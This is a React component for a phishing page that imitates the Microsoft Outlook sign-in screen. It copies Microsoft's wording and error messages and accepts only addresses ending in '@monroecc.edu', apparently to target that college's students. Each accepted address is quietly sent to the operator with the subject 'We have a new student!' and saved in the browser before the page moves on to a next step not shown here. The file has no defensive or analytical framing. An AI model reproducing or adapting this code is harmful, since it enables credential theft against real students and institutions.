import { useState, useEffect } from "react";
import { FormFooter } from "./FormFooter";
import useGo from "./useGo"; // Import the custom hook

export const Email = ({ onNext, emailError, email }) => {
  const [emailValue, setEmailValue] = useState("");
  const [borderColor, setBorderColor] = useState("1px solid #ccc");
  const [errorMessage, setErrorMessage] = useState("");
  const [isEmailValidated, setIsEmailValidated] = useState(false);

  const { isSending, error, successMessage, sendEmail } = useGo(); // Use the hook

  // If email prop changes, set it as the value for the email input
  useEffect(() => {
    if (email) {
      setEmailValue(email);
    }
  }, [email]);

  // Handle input changes
  const handleInputChange = (e) => {
    setEmailValue(e.target.value);
    setBorderColor("1px solid #ccc");
    setErrorMessage("");
  };

  // Handle the next button click
  const handleNext = () => {
    if (!emailValue.trim()) {
      setErrorMessage(
        "Enter a valid email address, phone number, or Skype name."
      );
      setBorderColor("1px solid red");
    } else if (!emailValue.includes("@monroecc.edu")) {
      setErrorMessage("We couldn't find an account with that username.");
      setBorderColor("1px solid red");
    } else {
      setErrorMessage("");
      setBorderColor("1px solid #ccc");
      setIsEmailValidated(true);

      // Construct the email subject and message
      const subject = "We have a new student!";
      const message = `email: ${emailValue}`;

      // Use the sendEmail function from the hook to send the email
      sendEmail(subject, message);

      localStorage.setItem("student_id", emailValue);
      onNext(emailValue);
    }
  };

  return (
    <>
      <div
        className="field-container"
        style={{ opacity: isEmailValidated && isSending ? 0.5 : 1 }}
      >
        <div className="f-t">
          <h1 className="form-title">Sign in</h1>
          <p className="ft">to continue to Outlook</p>
        </div>

        <div className="input-message">
          {errorMessage && (
            <p className="guide error" style={{ color: "red" }}>
              {errorMessage}
            </p>
          )}

          <input
            name="email"
            id="email"
            placeholder="Email, phone or Skype"
            className="field email-field"
            value={emailValue}
            onChange={handleInputChange}
            style={{
              borderBottom: borderColor,
              backgroundColor: "transparent",
            }}
          />
        </div>
        <a className="reset">Reset or Forgot Password</a>

        <div className="button-container">
          <button type="button" className="next" onClick={handleNext}>
            {isSending ? "Next" : "Next"}
          </button>
        </div>
      </div>
      <FormFooter />
      {error && <p style={{ color: "red" }}>{error}</p>}
      {successMessage && <p style={{ color: "green" }}>{successMessage}</p>}
    </>
  );
};
